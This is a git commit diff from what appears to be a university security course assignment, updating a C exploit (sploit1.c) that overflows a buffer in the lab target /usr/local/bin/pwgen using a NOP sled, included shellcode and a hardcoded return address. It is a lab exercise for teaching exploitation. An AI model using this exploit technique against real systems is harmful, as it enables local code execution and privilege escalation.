483d6da54e40be4f3446025ddda975129440d706
CS458_W18_1181 <ccchia@ugster05.student.cs>
2018-01-16 12:07:45 -0500

    sploit1 finally works!

--- Assignement 1/sploit1.c
+++ Assignement 1/sploit1.c
@@ -7,24 +7,23 @@
 #include <unistd.h>
 #include </usr/local/src/shellcode.h>
 
-#define DBSIZE 2048
+#define DBSIZE 562
 #define DOFFSET 0
 #define TARGET "/usr/local/bin/pwgen"
 #define NOP   0x90
-unsigned long get_sp(void){
-__asm__("movl %esp, %eax");
-}
+
 
 int main(int argc, char *argv[])
 {
   char *args[4];
   char *env[1];
   char *buf, *ptr;
-  char *addr_ptr, addr;
+  long *addr_ptr, addr;
   // one way to invoke pwgen, system() creates a separate process
   int i;
   int bsize = DBSIZE, offset = DOFFSET;
-  
+
+ 
 
   if(argc > 1) bsize = atoi(argv[1]);
     if(argc > 2) offset = atoi(argv[2]);
@@ -33,27 +32,29 @@ int main(int argc, char *argv[])
     printf("error");
     exit(0);
   }
-  addr = get_sp() - offset;
-  printf("Using address 0x%x...", addr);
+    printf("Using address 0x%x...", addr);
 
 
 
   ptr = buf; 
   addr_ptr = (long *) ptr;
   for (i = 0; i < bsize; i+=4)
-  *(addr_ptr++) = addr;
-  for(i = 0 ; i < bsize/2 ; i++)
-  buf[i] = NOP;
+  *(addr_ptr++) = 0xbfd7dfff;
+ for(i = 0 ; i < bsize/2 ; i++)
+ buf[i] = NOP;
 
-  ptr = buf + ((bsize/2) - (strlen(shellcode)/2 ));
+  ptr = buf + ((bsize/2)  - (strlen(shellcode)/2 ));
   for (i = 0 ; i <strlen(shellcode);i++)
       *(ptr++) = shellcode[i];
 
-    buf[bsize - 1] = '\0';//jump here. not overwrite here.
-
-
-
   
+    buf[bsize - 1] = '\0';//jump here. not overwrite here.
+//addrbuf = malloc(2000);
+//   for(i = 0; i < 2000;i+=4)
+//   addrbuf[i] = "\xff\xbf\xdd\x30";
+//addrbuf[2000] = '\0';
+
+ 
    
     args[0] = TARGET; args[1] = "-s";
     args[2] = buf; 
